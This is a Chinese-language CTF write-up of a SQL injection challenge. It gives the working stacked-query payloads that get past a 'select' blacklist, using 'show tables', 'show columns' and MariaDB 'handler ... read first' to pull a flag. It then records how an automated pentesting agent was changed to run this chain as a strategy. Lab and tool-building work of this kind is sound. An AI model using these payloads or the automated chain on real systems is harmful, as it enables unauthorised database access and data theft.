## 3. 注入点确认

正常请求：

```text
/?inject=1
```

响应中出现类似数组输出：

```text
1
hahahah
```

单引号探测：

```text
/?inject=1'
```

响应出现 MariaDB SQL 语法错误，确认 `inject` 参数进入 SQL 拼接上下文。

## 4. 过滤规则判断

尝试常规 union/select payload 后，响应泄露过滤逻辑：

```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

关键信息：

- `select / update / delete / drop / insert / where / .` 被黑名单拦截。
- `show` 未被拦截。
- 分号未被拦截，说明可能支持 stacked query。
- 表名如果是纯数字，后续需要用反引号包裹。

---

## 5. stacked query 枚举数据库结构

使用 stacked query 执行 `show tables`：

```text
/?inject=1';show tables;#
```

响应中可见表名：

```text
1919810931114514
words
```

隐藏表 `1919810931114514` 很像真 flag 表。因为它是纯数字表名，后续 SQL identifier 必须反引号引用；URL 中反引号可编码为 `%60`。

枚举隐藏表字段：

```text
/?inject=1';show columns from %601919810931114514%60;#
```

响应中出现字段：

```text
flag
```

---

## 6. 绕过 select 读取 flag

由于 `select` 被过滤，不能直接：

```sql
select flag from `1919810931114514`
```

MySQL/MariaDB 的 `handler` 语句不包含 `select` 关键字，可以直接按存储引擎接口读取表记录：

```text
/?inject=1';handler %601919810931114514%60 open;handler %601919810931114514%60 read first;#
```

响应中得到：

```text
DASCTF{07423849-4854-4b8e-99a3-90d6b83ede12}
```

最终利用链：

```text
1. ?inject=1'
2. ?inject=1';show tables;#
3. ?inject=1';show columns from `1919810931114514`;#
4. ?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;#
```

## 7. FlagHunter 初始表现

首次端到端运行时，项目没有稳定解出，主要失败点有三个：

1. CLI 把 CTF 子类型 `unknown` 原样传入 dispatcher，导致自动类型识别效果被削弱。
2. SQLi capability registry 没有在链路前预热，`sql_injection_test` 路由不稳定。
3. SQLi 链只覆盖了 auth form / sqlmap 思路，没有覆盖这种 GET 参数 + 黑名单 + stacked query + handler read 的轻量手工路径。

典型失败现象：

```text
detected_type=unknown
sqlmap finished without direct flag
fallback probing did not recover flag
```

## 8. 项目改造记录

### 8.1 CLI auto subtype 修复

文件：

```text
pentestagent/interface/cli.py
```

修复点：

- 将 `modeSubtype=unknown` 规范化为空。
- 调用 dispatcher 时使用 `type=resolved_subtype or "auto"`。

效果：

- 未明确指定 CTF 子类型时，dispatcher 能继续做 auto detection。
- 实靶重新进入 `detected_type=sqli`。

### 8.2 capability registry 预热

文件：

```text
pentestagent/agents/pa_agent/ctf_dispatcher.py
```

修复点：

- 在 CTF run 前，如果 `capability_table` 为空，先执行 `capability_registry.full_check()`。

效果：

- SQLi 链路执行前能知道 `sqlmap` / `manual_payload_via_requests` 等实现是否可用。

### 8.3 generic GET 参数 SQLi fallback

文件：

```text
pentestagent/agents/pa_agent/ctf_dispatcher.py
```

新增能力：

- 识别 GET 表单中的可注入字段。
- 自动做 baseline 和 quote probe。
- 当发现 SQL error 后，尝试：
  - `show tables`
  - `show columns from <table>`
  - `handler <table> open; handler <table> read first`
- 解析 PHP `var_dump` 风格输出中的字符串。
- 发现 flag 后走统一 verifier，而不是直接宣布成功。

### 8.4 提升为一等策略

涉及文件：

```text
pentestagent/agents/pa_agent/strategy_registry.py
pentestagent/agents/pa_agent/hypothesis_engine.py
pentestagent/agents/pa_agent/recovery.py
pentestagent/agents/pa_agent/ctf_dispatcher.py
```

策略名：

```text
generic_param_sqli
```

现在它已经不是私有 fallback，而是具备完整策略身份：

- `hypothesis_engine` 能根据 GET 参数表单和 SQL error 生成 `generic_param_sqli` 假设。
- `strategy_registry` 能注册并调度该策略。
- `ctf_dispatcher` 能把它映射到 `sqli` 链。
- `recovery` 的 verbal reflection 能识别该策略。
- strategy memory 中能记录 `winning_hypothesis_kinds=["generic_param_sqli"]`。

同时收紧了 `_has_login_form()`：

- 以前“有表单”就可能被当成登录表单。
- 现在必须同时具备 user/login/account/email 类字段和 password/pass/pwd 类字段。
- 这样 GET 参数 SQLi 页面不会误入 `auth_form_sqli`。

## 11. 可复用经验

这类题面的稳定信号：

- GET 参数直接进入 SQL 拼接。
- 单引号触发 SQL syntax error。
- 页面或响应出现 `sqlmap是没有灵魂的` 一类提示。
- 黑名单包含 `select`，但未过滤 `show` / `handler` / 分号。
- `show tables` 能返回数字表名或明显异常表名。

推荐自动化最短链：

```text
quote probe -> show tables -> show columns -> handler read first -> verifier
```

策略边界：

- 该策略只适合少量 GET 参数和明确 SQL error / stacked-query 信号。
- 不应升级成大规模 payload fuzz。
- 如果 `show tables` 无结果，应停止该轻量分支，回到其他 SQLi 或 Web 分支。

---

## 12. 后续改进建议

1. 将 `generic_param_sqli` 的成功样本整理成 eval catalog，避免后续 refactor 破坏这一题型。
2. 为 `handler read next` 增加受限循环，仅在 `read first` 无 flag 但表结构含 `flag` 字段时尝试，最大读取次数应很小。
3. 在 strategy memory 的 atomic facts 中增加更准确的 `surface:get_form_param`、`error:sql_error`、`primitive:stacked_query`，减少类似题型的冷启动试错。
4. 对数字表名、反引号转义、PHP `var_dump` 输出解析分别补独立小单测，防止解析逻辑被未来改动误伤。
